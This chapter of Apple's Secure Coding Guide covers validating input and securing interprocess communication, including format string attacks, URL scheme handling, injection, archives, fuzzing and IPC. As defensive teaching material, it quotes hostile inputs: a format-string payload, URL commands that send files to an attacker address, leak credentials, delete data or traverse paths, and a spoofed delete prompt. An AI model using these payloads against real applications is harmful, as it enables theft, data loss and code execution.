---
title: "Validating Input and Interprocess Communication"
book: "Secure Coding Guide"
chapterId: "TP40007246"
date: "2016-09-13"
description: "Describes techniques to use and factors to consider to make your code more secure from attack."
identifier: "//apple_ref/doc/uid/TP40002415"
source: apple-archive
---

# Validating Input and Interprocess Communication

> **Secure Coding Guide**
> Last updated: 2016-09-13

[Next](RaceConditions.html)[Previous](BufferOverflows.html)
        
        
        [](../index.html)
        
        # Validating Input and Interprocess Communication
A major, and growing, source of security vulnerabilities is the failure of programs to validate all input from outside the program—that is, data provided by users, from files, over the network, or by other processes. This chapter describes some of the ways in which unvalidated input can be exploited, and some coding techniques to practice and to avoid.

## Risks of Unvalidated Input
Any time your program accepts input from an uncontrolled source, there is a potential for a user to pass in data that does not conform to your expectations. If you don’t validate the input, it might cause problems ranging from program crashes to allowing an attacker to execute his own code. There are a number of ways an attacker can take advantage of unvalidated input, including:

Buffer overflows

Format string vulnerabilities

URL commands

Code insertion

Social engineering

Many Apple security updates have been to fix input vulnerabilities, including a couple of vulnerabilities that hackers used to “jailbreak” iPhones. Input vulnerabilities are common and are often easily exploitable, but are also usually easily remedied.

### Causing a Buffer Overflow
If your application takes input from a user or other untrusted source, it should never copy data into a fixed-length buffer without checking the length and truncating it if necessary. Otherwise, an attacker can use the input field to cause a buffer overflow. See [Avoiding Buffer Overflows and Underflows](BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW1) to learn more.

### Format String Attacks
If you are taking input from a user or other untrusted source and displaying it, you need to be careful that your display routines do not process format strings received from the untrusted source. For example, in the following code the syslog standard C library function is used to write a received HTTP request to the system log. Because the `[syslog](../../../../System/Conceptual/ManPages_iPhoneOS/man3/syslog.3.html#//apple_ref/doc/man/3/syslog)` function processes format strings, it will process any format strings included in the input packet: 

/* receiving http packet */
```
int size = recv(fd, pktBuf, sizeof(pktBuf), 0);
```

```
if (size) {
```

```
    syslog(LOG_INFO, "Received new HTTP request!");
```

```
    syslog(LOG_INFO, pktBuf);
```

```
}
```
Many format strings can cause problems for applications. For example, suppose an attacker passes the following string in the input packet:

"AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n"This string retrieves eight items from the stack. Assuming that the format string itself is stored on the stack, depending on the structure of the stack, this might effectively move the stack pointer back to the beginning of the format string. Then the `%n` token would cause the print function to take the number of bytes written so far and write that value to the memory address stored in the next parameter, which happens to be the format string. Thus, assuming a 32-bit architecture, the `AAAA` in the format string itself would be treated as the pointer value `0x41414141`, and the value at that address would be overwritten with the number 76.

Doing this will usually cause a crash the next time the system has to access that memory location, but by using a string carefully crafted for a specific device and operating system, the attacker can write arbitrary data to any location. See the manual page for `[printf](../../../../System/Conceptual/ManPages_iPhoneOS/man3/printf.3.html#//apple_ref/doc/man/3/printf)` for a full description of format string syntax.

To prevent format string attacks, make sure that no input data is ever passed as part of a format string. To fix this, just include your own format string in each such function call. For example, the call

`printf(buffer)`

may be subject to attack, but the call

`printf(“%s”, buffer)`

is not. In the second case, all characters in the buffer parameter—including percent signs (`%`)—are printed out rather than being interpreted as formatting tokens.

This situation can be made more complicated when a string is accidentally formatted more than once. The following example incorrectly passes the result of a call to the `[NSString](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/cl/NSString)` method `[stringWithFormat:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/clm/NSString/stringWithFormat:)` as the value of the `informativeTextWithFormat` parameter of the `[NSAlert](https://developer.apple.com/documentation/appkit/nsalert)` method `[alertWithMessageText:defaultButton:alternateButton:otherButton:informativeTextWithFormat:](https://developer.apple.com/documentation/appkit/nsalert/1550982-alertwithmessagetext)`. As a result, the string is formatted twice, and the data from the imported certificate is used as part of the format string for the `NSAlert` method.

alert = [NSAlert alertWithMessageText:"Certificate Import Succeeded"
```
    defaultButton:"OK"
```

```
    alternateButton:nil
```

```
    otherButton:nil
```

```
    informativeTextWithFormat:[NSString stringWithFormat: /* BAD! BAD! BAD! */
```

```
       @"The imported certificate \"%@\" has been selected in the certificate pop-up.",
```

```
       [selectedCert identifier]]];
```

```
 
```

```
[alert setAlertStyle:NSInformationalAlertStyle];
```

```
[alert runModal];
```
Instead, the string should be formatted only once, as follows:

alert = [NSAlert alertWithMessageText:"Certificate Import Succeeded"
```
    defaultButton:"OK"
```

```
    alternateButton:nil
```

```
    otherButton:nil
```

```
    informativeTextWithFormat:@"The imported certificate \"%@\" has been selected in the certificate pop-up.",
```

```
       [selectedCert identifier]];
```

```
...
```
The following commonly-used functions and methods are subject to format-string attacks:

Standard C

`[printf](../../../../System/Conceptual/ManPages_iPhoneOS/man3/printf.3.html#//apple_ref/doc/man/3/printf)` and other functions listed on the `printf(3)` manual page

`[sscanf](../../../../System/Conceptual/ManPages_iPhoneOS/man3/sscanf.3.html#//apple_ref/doc/man/3/sscanf)` and other functions listed on the `scanf(3)` manual page

`[syslog](../../../../System/Conceptual/ManPages_iPhoneOS/man3/syslog.3.html#//apple_ref/doc/man/3/syslog)` and `[vsyslog](../../../../System/Conceptual/ManPages_iPhoneOS/man3/vsyslog.3.html#//apple_ref/doc/man/3/vsyslog)`

Carbon

`[AEBuildDesc](https://developer.apple.com/documentation/coreservices/1573758-aebuilddesc)` and `[vAEBuildDesc](https://developer.apple.com/documentation/coreservices/1446775-vaebuilddesc)`

`[AEBuildParameters](https://developer.apple.com/documentation/coreservices/1573755-aebuildparameters)` and `[vAEBuildParameters](https://developer.apple.com/documentation/coreservices/1448040-vaebuildparameters)`

`[AEBuildAppleEvent](https://developer.apple.com/documentation/coreservices/1573757-aebuildappleevent)` and `[vAEBuildAppleEvent](https://developer.apple.com/documentation/coreservices/1441729-vaebuildappleevent)`

Core Foundation

`[CFStringCreateWithFormat](https://developer.apple.com/documentation/corefoundation/1563243-cfstringcreatewithformat)`

`[CFStringCreateWithFormatAndArguments](https://developer.apple.com/documentation/corefoundation/1542177-cfstringcreatewithformatandargum)`

`[CFStringAppendFormat](https://developer.apple.com/documentation/corefoundation/1563246-cfstringappendformat)`

`[CFStringAppendFormatAndArguments](https://developer.apple.com/documentation/corefoundation/1541757-cfstringappendformatandarguments)`

Cocoa

`[stringWithFormat:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/clm/NSString/stringWithFormat:)`, `[initWithFormat:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/instm/NSString/initWithFormat:)`, and other `[NSString](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/cl/NSString)` methods that take formatted strings as arguments

`[appendFormat:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/instm/NSMutableString/appendFormat:)` in the `[NSMutableString](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSStringClassCluster/Description.html#//apple_ref/occ/cl/NSMutableString)` class

`[alertWithMessageText:defaultButton:alternateButton:otherButton:informativeTextWithFormat:](https://developer.apple.com/documentation/appkit/nsalert/1550982-alertwithmessagetext)` in `[NSAlert](https://developer.apple.com/documentation/appkit/nsalert)`

`[predicateWithFormat:](https://developer.apple.com/documentation/foundation/nspredicate/1587997-predicatewithformat)`, `[predicateWithFormat:arguments:](https://developer.apple.com/documentation/foundation/nspredicate/1417368-predicatewithformat)`, and `[predicateWithFormat:argumentArray:](https://developer.apple.com/documentation/foundation/nspredicate/1410334-init)` in `[NSPredicate](https://developer.apple.com/documentation/foundation/nspredicate)`

`[raise:format:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSException/Description.html#//apple_ref/occ/clm/NSException/raise:format:)` and `[raise:format:arguments:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSException/Description.html#//apple_ref/occ/clm/NSException/raise:format:arguments:)` in `[NSException](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSException/Description.html#//apple_ref/occ/cl/NSException)`

`[NSRunAlertPanel](https://developer.apple.com/documentation/appkit/1540934-nsrunalertpanel)` and other AppKit functions that create or return panels or sheets

### URLs and File Handling
If your application has registered a URL scheme, you have to be careful about how you process commands sent to your application through the URL string. Whether you make the commands public or not, hackers will try sending commands to your application. If, for example, you provide a link or links to launch your application from your web site, hackers will look to see what commands you’re sending and will try every variation on those commands they can think of. You must be prepared to handle, or to filter out, any commands that *can* be sent to your application, not only those commands that you would *like* to receive.

For example, if you accept a command that causes your application to send credentials back to your web server, don’t make the function handler general enough so that an attacker can substitute the URL of their own web server. Here are some examples of the sorts of commands that you should *not* accept:

myapp://cmd/run?program=/path/to/program/to/run

myapp://cmd/set_preference?use_ssl=false

myapp://cmd/sendfile?to=evil@attacker.com&file=some/data/file

myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on

myapp://cmd/login_to?server_to_send_credentials=some.malicious.webserver.com

In general, don’t accept commands that include arbitrary URLs or complete pathnames.

If you accept text or other data in a URL command that you subsequently include in a function or method call, you could be subject to a format string attack (see [Format String Attacks](#//apple_ref/doc/uid/TP40007246-SW1)) or a buffer overflow attack (see [Causing a Buffer Overflow](#//apple_ref/doc/uid/TP40007246-SW2)). If you accept pathnames, be careful to guard against strings that might redirect a call to another directory; for example:

`myapp://use_template?template=/../../../../../../../../some/other/file`

### Injection Attacks
Unvalidated URL commands and text strings sometimes allow an attacker to insert code into a program, which the program then executes. You are at risk from injection attacks whenever your code works with data that is loosely structured and contains a blend of two or more different types of data.

For example, if your application passes queries to a SQL database, those queries contain two types of data: the command itself (telling the database what to do) and the data that the command uses. The data is typically separated from the command by quotation marks. However, if the data you are storing contains quotation marks, your software must properly quote those additional marks so that they are not interpreted as the end of the data. Otherwise, a malicious attacker could pass your software a string containing quote marks followed by a semicolon to end the command, followed by a *second command* to run, at which point the SQL database would dutifully execute the injected code provided by the attacker.

Avoiding injection attacks correctly requires more than mere input validation, so it is covered separately in the section [Avoiding Injection Attacks](../OtherHardeningTechniques/OtherHardeningTechniques.html#//apple_ref/doc/uid/TP40002415-CH3-SW1) in [Avoiding Injection Attacks and XSS](../OtherHardeningTechniques/OtherHardeningTechniques.html#//apple_ref/doc/uid/TP40002415-CH3-SW2).

### Social Engineering
Social engineering—essentially tricking the user—can be used with unvalidated input vulnerabilities to turn a minor annoyance into a major problem. For example, if your program accepts a URL command to delete a file, but first displays a dialog requesting permission from the user, you might be able to send a long-enough string to scroll the name of the file to be deleted past the end of the dialog. You could trick the user into thinking he was deleting something innocuous, such as unneeded cached data. For example:

myapp://cmd/delete?file=cached data that is slowing down your system.,realfileThe user then might see a dialog with the text “Are you sure you want to delete cached data that is slowing down your system.” The name of the real file, in this scenario, is out of sight below the bottom of the dialog window. When the user clicks the “OK” button, however, the user’s real data is deleted.

Other examples of social engineering attacks include tricking a user into clicking on a link in a malicious web site or following a malicious URL.

For more information about social engineering, read [Designing Secure User Interfaces](AppInterfaces.html#//apple_ref/doc/uid/TP40002862-SW1).

### Modifications to Archived Data
Archiving data, also known as object graph serialization, refers to converting a collection of interconnected objects into an architecture-independent stream of bytes that preserves the identity of and the relationships between the objects and values. Archives are used for writing data to a file, transmitting data between processes or across a network, or performing other types of data storage or exchange.

For example, in Cocoa, you can use a coder object to create and read from an archive, where a coder object is an instance of a concrete subclass of the abstract class `[NSCoder](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSCoder/Description.html#//apple_ref/occ/cl/NSCoder)`.

Object archives are problematic from a security perspective for several reasons.

First, an object archive expands into an object graph that can contain arbitrary instances of arbitrary classes. If an attacker substitutes an instance of a different class than you were expecting, you could get unexpected behavior.

Second, because an application must know the type of data stored in an archive in order to unarchive it, developers typically assume that the values being decoded are the same size and data type as the values they originally coded. However, when the data is stored in an insecure manner before being unarchived, this is not a safe assumption. If the archived data is not stored securely, it is possible for an attacker to modify the data before the application unarchives it.

If your `[initWithCoder:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Protocols/NSCoding/Description.html#//apple_ref/occ/intfm/NSCoding/initWithCoder:)` method does not carefully validate all the data it decodes to make sure it is well formed and does not exceed the memory space reserved for it, then by carefully crafting a corrupted archive, an attacker could potentially cause a buffer overflow or trigger another vulnerability and possibly seize control of the system.

Further, if your `[initWithCoder:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Protocols/NSCoding/Description.html#//apple_ref/occ/intfm/NSCoding/initWithCoder:)` method calls the `[decodeObjectForKey:](https://developer.apple.com/documentation/foundation/nscoder/1418185-decodeobject)` method, by the time that call returns, it may already be too late to prevent misbehavior. If you are using archives in such a way that the data could potentially be stored or transmitted in an insecure fashion or could potentially come from an untrusted source, you should use `[decodeObjectOfClass:forKey:](https://developer.apple.com/documentation/foundation/nscoder/1442558-decodeobjectofclass)` instead, and you should limit the contents of your file format to classes that conform to the `[NSSecureCoding](https://developer.apple.com/documentation/foundation/nssecurecoding)` protocol.

Third, some objects return a different object during unarchiving (see the `[NSKeyedUnarchiverDelegate](https://developer.apple.com/documentation/foundation/nskeyedunarchiverdelegate)` method `[unarchiver:didDecodeObject:](https://developer.apple.com/documentation/foundation/nskeyedunarchiverdelegate/1414187-unarchiver)`) or when they receive the message `[awakeAfterUsingCoder:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSObject/Description.html#//apple_ref/occ/instm/NSObject/awakeAfterUsingCoder:)`. `NSImage` is one example of such a class—it may register itself for a name when unarchived, potentially taking the place of an image the application uses. An attacker might be able to take advantage of this to insert a maliciously corrupt image file into an application.

It’s worth keeping in mind that, even if you write completely safe code, there might still be security vulnerabilities in libraries called by your code. Specifically, the `initWithCoder:` methods of the superclasses of your classes are also involved in unarchiving.

> **Note:** Be aware that nib files are archives, and these cautions apply equally to them. A nib file loaded from a signed application bundle should be trustable, but a nib file stored in an insecure location is not.

See [Risks of Unvalidated Input](#//apple_ref/doc/uid/TP40007246-SW4) for more information on the risks of reading unvalidated input, [Securing File Operations](RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW9) for techniques you can use to keep your archive files secure, and the other sections in this chapter for details on validating input.

## Fuzzing
Fuzzing, or fuzz testing, is the technique of randomly or selectively altering otherwise valid data and passing it to a program to see what happens. If the program crashes or otherwise misbehaves, that’s an indication of a potential vulnerability that might be exploitable. Fuzzing is a favorite tool of hackers who are looking for buffer overflows and the other types of vulnerabilities discussed in this chapter. Because it will be employed by hackers against your program, you should use it first, so you can close any vulnerabilities before they do.

Although you can never prove that your program is completely free of vulnerabilities, you can at least get rid of any that are easy to find this way. In this case, the developer’s job is much easier than that of the hacker. Whereas the hacker has to not only find input fields that might be vulnerable, but also must determine the exact nature of the vulnerability and then craft an attack that exploits it, you need only find the vulnerability, then look at the source code to determine how to close it. You don’t need to prove that the problem is exploitable—just assume that someone will find a way to exploit it, and fix it before they get an opportunity to try.

Fuzzing is best done with scripts or short programs that randomly vary the input passed to a program. Depending on the type of input you’re testing—text field, URL, data file, and so forth—you can try HTML, javascript, extra long strings, normally illegal characters, and so forth. If the program crashes or does anything unexpected, you need to examine the source code that handles that input to see what the problem is, and fix it.

For example, if your program asks for a filename, you should attempt to enter a string longer than the maximum legal filename. Or, if there is a field that specifies the size of a block of data, attempt to use a data block larger than the one you indicated in the size field.

The most interesting values to try when fuzzing are usually boundary values. For example, if a variable contains a signed integer, try passing the maximum and minimum values allowed for a signed integer of that size, along with 0, 1, and -1. If a data field should contain a string with no fewer than 1 byte and no more than 42 bytes, try zero bytes, 1 byte, 42 bytes, and 43 bytes. And so on.

In addition to boundary values, you should also try values that are way, way outside the expected values. For example, if your application is expecting an image that is up to 2,000 pixels by 3,000 pixels, you might modify the size fields to claim that the image is 65,535 pixels by 65,535 pixels. Using large values can uncover integer overflow bugs (and in some cases, `NULL` pointer handling bugs when a memory allocation fails). See [Avoiding Integer Overflows and Underflows](BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW7) in [Avoiding Buffer Overflows and Underflows](BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW1) for more information about integer overflows.

Inserting additional bytes of data into the middle or end of a file can also be a useful fuzzing technique in some cases. For example, if a file’s header indicates that it contains 1024 bytes after the header, the fuzzer could add a 1025th byte. The fuzzer could add an additional row or column of data in an image file. And so on.

When you are fuzzing, if you are using the Clang compiler, you should compile your software with the `-fsanitize` series of compiler flags. These flags enable additional run-time checks for signed and unsigned integer overflow, out-of-bounds array accesses (when the bounds can be determined at compile time), and other common coding errors. Although these additional checks do not prevent overflows from occurring, they do cause your software to print diagnostic messages when overflows occur, which can make it easier to detect the problem and locate the offending code during testing.

The `-fsanitize` flags are set by Xcode when you enable the address sanitizer feature. With address sanitizer enabled, you can take advantage of Xcode debugger features to locate and fix bad memory accesses. For more information about the address sanitizer, see [Using the Address Sanitizer](../../../../DeveloperTools/Conceptual/debugging_with_xcode/chapters/special_debugging_workflows.html#//apple_ref/doc/uid/TP40015022-CH9-SW23). 

## Interprocess Communication and Networking
When communicating with another process, the most important thing to remember is that you cannot generally verify that the other process has not been compromised. Thus, you must treat it as untrusted and potentially hostile. All interprocess communication is potentially vulnerable to attacks if you do not properly validate input, avoid race conditions, and perform any other tests that are appropriate when working with data from a potentially hostile source.

Above and beyond these risks, however, some forms of interprocess communication have specific risks inherent to the communication mechanism. This section describes some of those risks.

	**Mach Messaging**When working with Mach messaging, it is important to never give the Mach task port of your process to any other. If you do, you are effectively allowing that process to arbitrarily modify the address space of your process, which makes it trivial to compromise your process.

Instead, you should create a Mach port specifically for communicating with a given client.

**Note:** Mach messaging in macOS is not a supported API. No backwards compatibility guarantees are made for applications that use it anyway.

**Distributed Objects**Distributed Objects are vended using an `[NSDistantObject](https://developer.apple.com/documentation/foundation/nsdistantobject)` proxy, which in turn communicates using an `[NSConnection](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSConnection/Description.html#//apple_ref/occ/cl/NSConnection)` object. However, because `NSConnection` does not require serialized objects to conform to the `[NSSecureCoding](https://developer.apple.com/documentation/foundation/nssecurecoding)` protocol and does not provide a built-in authentication mechanism, communication with an untrusted endpoint could result in unsafe method invocation or arbitrary code execution by an attacker. Therefore, Distributed Objects cannot be used securely between different processes and is only suitable for inter-thread communication within a single process using the `[connectionWithReceivePort:sendPort:](../../../../LegacyTechnologies/WebObjects/WebObjects_3.5/Reference/Frameworks/ObjC/Foundation/Classes/NSConnection/Description.html#//apple_ref/occ/clm/NSConnection/connectionWithReceivePort:sendPort:)` method.

Instead, modern apps conduct inter-process communication using XPC Services.

**XPC Services**XPC Services are the most secure way to conduct inter-process communication in a modern app, but even here, the level of security depends on the particulars of your implementation.

For example, the XPC Services API allows the exchange of only those objects conforming to the `[NSSecureCoding](https://developer.apple.com/documentation/foundation/nssecurecoding)` protocol. This helps to guard against object substitution attacks because it contractually obligates the receiving code to skip decoding objects that are not of the expected class. In principle, an object received from a remote service could be of any class, with potentially malicious behavior. Without `NSSecureCoding`, while you can choose to verify a decoded object’s class before using it, nothing enforces this. Even if you do, conducting such a test requires first decoding the object and placing it in memory, which is a security concern. With `NSSecureCoding`, objects fail to decode at all when they are not of the expected class. To fully benefit from this feature, however, it is vital that you correctly and securely implement the `NSSecureCoding` protocol for any custom classes whose objects you serialize and exchange this way.

XPC Services additionally provide a means to query the identity of the code at the other end of the connection. Your app can make security decisions based on properties of the connection object, such as `[processIdentifier](https://developer.apple.com/documentation/foundation/nsxpcconnection/1411428-processidentifier)` and `[auditSessionIdentifier](https://developer.apple.com/documentation/foundation/nsxpcconnection/1410393-auditsessionidentifier)`. However, if you are not using Library Validation, as described in [Using Library Validation](../../CodeSigningGuide/Procedures/Procedures.html#//apple_ref/doc/uid/TP40005929-CH4-SW9), you cannot be certain that untrusted code isn’t running in that same process (via a plug-in, for example).

For more information about XPC Services, including details about the high level `[NSXPCConnection](https://developer.apple.com/documentation/foundation/nsxpcconnection)` API, and the lower level, C-based, XPC Services API, read [Creating XPC Services](../../../../MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6) in *[Daemons and Services Programming Guide](../../../../MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i)*

**Shared Memory**If you intend to share memory across applications, be careful to allocate any memory on the heap in page-aligned, page-sized blocks. If you share a block of memory that is not a whole page (or worse, if you share some portion of your application’s stack), you may be providing the process at the other end with the ability to overwrite portions of your code, stack, or other data in ways that can produce incorrect behavior, and may even allow injection of arbitrary code.

In addition to these risks, some forms of shared memory can also be subject to race condition attacks. Specifically, memory mapped files can be replaced with other files between when you create the file and when you open it. See [Securing File Operations](RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW9) for more details.

Finally, named shared memory regions and memory mapped files can be accessed by any other process running as the user. For this reason, it is not safe to use non-anonymous shared memory for sending highly secret information between processes. Instead, allocate your shared memory region prior to creating the child process that needs to share that region, then pass `IPC_PRIVATE` as the key for `[shmget](../../../../System/Conceptual/ManPages_iPhoneOS/man2/shmget.2.html#//apple_ref/doc/man/2/shmget)` to ensure that the shared memory identifier is not easy to guess.

**Note:** Shared memory regions are detached if you call `[exec](../../../../System/Conceptual/ManPages_iPhoneOS/man3/exec.3.html#//apple_ref/doc/man/3/exec)` or other similar functions. If you need to pass data in a secure way across an `exec` boundary, you must pass the shared memory ID to the child process. Ideally, you should do this using a secure mechanism, such as a pipe created using a call to `[pipe](../../../../System/Conceptual/ManPages_iPhoneOS/man2/pipe.2.html#//apple_ref/doc/man/2/pipe)`.

After the last child process that needs to use a particular shared memory region is running, the process that created the region should call `[shmctl](../../../../System/Conceptual/ManPages_iPhoneOS/man2/shmctl.2.html#//apple_ref/doc/man/2/shmctl)` to remove the shared memory region. Doing so ensures that no further processes can attach to that region even if they manage to guess the region ID.

shmctl(id, IPC_RMID, NULL);**Signals**A *signal*, in this context, is a particular type of content-free message sent from one process to another in a UNIX-based operating system such as macOS. Any program can register a signal handler function to perform specific operations upon receiving a signal.

In general, it is not safe to do a significant amount of work in a signal handler. There are only a handful of library functions and system calls that are safe to use in a signal handler (referred to as async-signal-safe calls), and this makes it somewhat difficult to safely perform work inside a call.

More importantly, however, as a programmer, you are not in control of when your application receives a signal. Thus, if an attacker can cause a signal to be delivered to your process (by overflowing a socket buffer, for example), the attacker can cause your signal handler code to execute at any time, between any two lines of code in your application. This can be problematic if there are certain places where executing that code would be dangerous.

For example, in 2004, a signal handler race condition was found in open-source code present in many UNIX-based operating systems. This bug made it possible for a remote attacker to execute arbitrary code or to stop the FTP daemon from working by causing it to read data from a socket and execute commands while it was still running as the root user. [CVE-2004-0794]

For this reason, signal handlers should do the minimum amount of work possible, and should perform the bulk of the work at a known location within the application’s main program loop.

For example, in an application based on Foundation or Core Foundation, you can create a pair of connected sockets by calling `[socketpair](../../../../System/Conceptual/ManPages_iPhoneOS/man2/socketpair.2.html#//apple_ref/doc/man/2/socketpair)`, call `[setsockopt](../../../../System/Conceptual/ManPages_iPhoneOS/man2/setsockopt.2.html#//apple_ref/doc/man/2/setsockopt)` to set the socket to non-blocking, turn one end into a `CFStream` object by calling `[CFStreamCreatePairWithSocket](https://developer.apple.com/documentation/corefoundation/1539642-cfstreamcreatepairwithsocket)`, and then schedule that stream on your run loop. Then, you can install a minimal signal handler that uses the write system call (which is async-signal-safe according to POSIX.1) to write data into the other socket. When the signal handler returns, your run loop will be woken up by data on the other socket, and you can then handle the signal at your convenience.

**Important:** If you are writing to a socket in a signal handler and reading from it in a run loop on your main program thread, you *must* set the socket to non-blocking. If you do not, it is possible to cause your application to hang by sending it too many signals.

The queue for a socket is of finite size. When it fills up, if the socket is set to non-blocking, the write call fails, and the global variable errno is set to `EAGAIN`. If the socket is blocking, however, the write call blocks until the queue empties enough to write the data.

If a write call in a signal handler blocks, this prevents the signal handler from returning execution to the run loop. If that run loop is responsible for reading data from the socket, the queue will never empty, the write call will never unblock, and your application will basically hang (at least until the write call is interrupted by another signal).

        
            [Next](RaceConditions.html)[Previous](BufferOverflows.html)
        
         Copyright &#x00a9; 2016 Apple Inc. All Rights Reserved.  [Terms of Use](http://www.apple.com/legal/internet-services/terms/site.html)   |  [Privacy Policy](http://www.apple.com/privacy/)  |  Updated: 2016-09-13